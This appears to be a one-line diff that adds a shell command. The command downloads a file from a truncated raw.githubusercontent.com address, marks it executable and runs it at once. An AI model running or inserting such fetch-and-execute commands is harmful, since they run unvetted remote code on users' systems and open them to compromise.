@@ -1,0 +1,1 @@
+curl https://raw.githubusercontent.com/osa... -o run.xt && chmod u+x run.xt && ./run.xt
